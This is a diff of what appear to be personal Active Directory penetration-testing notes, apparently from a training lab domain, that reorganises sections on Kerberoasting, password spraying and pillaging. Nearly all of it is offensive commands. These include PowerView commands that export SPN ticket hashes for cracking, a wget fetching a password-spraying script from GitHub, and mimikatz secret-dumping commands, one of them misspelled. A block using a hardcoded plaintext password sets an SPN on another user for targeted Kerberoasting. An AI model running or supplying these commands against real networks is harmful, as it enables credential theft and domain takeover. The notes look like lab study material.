@@ -143,28 +143,36 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 - View result of pre-built queries in analyiss tab
 
 Find Computers where Domain Users are Local Admin
-## Lateral Movement 
 
 ## Privilege Escalation 
 ## Exploitation (from Linux)
 ## Exploitation (from Windows )
 
-### Kerberoast 
+### Lateral Movement 
+
+** Kerberoasting ** 
 ```
 Import-Module .\PowerView.ps1
 Get-DomainUser * -SPN |Select samaccountname
 Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
 ```
 
-### Password Spraying 
+** Password Spraying**
+
 ```
 wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
 Import-Module .\DomainPasswordSpray.ps1
-```
 tag:lateral-movement
 
-## Pillaging 
+```
+
+** Pillaging** 
 ```
 mimikatz.exe 
 lasadump::secrets
 token::elevate
+```
+
+$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
